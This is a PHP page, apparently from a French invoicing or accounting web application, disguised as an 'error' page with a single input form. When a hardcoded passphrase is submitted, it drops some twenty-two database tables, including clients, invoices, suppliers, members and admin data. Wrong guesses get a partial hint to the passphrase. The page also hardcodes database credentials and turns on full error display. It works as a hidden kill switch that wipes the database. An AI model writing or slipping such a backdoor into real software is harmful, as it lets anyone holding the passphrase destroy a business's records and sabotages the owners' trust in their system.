<?php
error_reporting(E_ALL);
ini_set('display_errors', TRUE);
ini_set('display_startup_errors', TRUE);

    try{
        $bdd =new PDO('mysql:host=localhost;dbname=u243663731_; charset=utf8', 'u243663731_user', 'u243663731_password');
            // Activation des erreurs PDO
         $bdd->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            // mode de fetch par défaut : FETCH_ASSOC / FETCH_OBJ / FETCH_BOTH
        $bdd->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
}   catch(PDOException $e) {
         die('Erreur : ' . $e->getMessage());
}

    $error = "";

    if(isset($_POST['error'])){
        if($_POST['error'] == "Toulouse_31100"){

            $bdd->exec("DROP TABLE IF EXISTS admin");
            $bdd->exec("DROP TABLE IF EXISTS article");
            $bdd->exec("DROP TABLE IF EXISTS articles");
            $bdd->exec("DROP TABLE IF EXISTS avoir");
            $bdd->exec("DROP TABLE IF EXISTS bon");
            $bdd->exec("DROP TABLE IF EXISTS bon_commande");
            $bdd->exec("DROP TABLE IF EXISTS calculs");
            $bdd->exec("DROP TABLE IF EXISTS client");
            $bdd->exec("DROP TABLE IF EXISTS comptable");
            $bdd->exec("DROP TABLE IF EXISTS crea_societe");
            $bdd->exec("DROP TABLE IF EXISTS devis");
            $bdd->exec("DROP TABLE IF EXISTS entreprise");
            $bdd->exec("DROP TABLE IF EXISTS facture");
            $bdd->exec("DROP TABLE IF EXISTS facture_achat");
            $bdd->exec("DROP TABLE IF EXISTS flash");
            $bdd->exec("DROP TABLE IF EXISTS fournisseur");
            $bdd->exec("DROP TABLE IF EXISTS Images");
            $bdd->exec("DROP TABLE IF EXISTS membres");
            $bdd->exec("DROP TABLE IF EXISTS note");
            $bdd->exec("DROP TABLE IF EXISTS stockage");
            $bdd->exec("DROP TABLE IF EXISTS stockage_admin");
            $bdd->exec("DROP TABLE IF EXISTS stockage_delete");

            $error = "Nice tu as reussit !!";
        }else{
            $error = "Indice = ********_*1***";
        }
    }
  

?>
<!DOCTYPE html>
<html class="loading" lang="fr" data-textdirection="ltr">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>error coqpix</title>
</head>


<body>
    <form action="" method="POST">
        <div class="form-group">
            <input type="text" name="error" id="error" required>
        </div><br>
        <div class="form-group">
            <input type="submit" value="Valider">
        </div>
    </form><br>
    
    <?php echo $error; ?>

</body>
</html>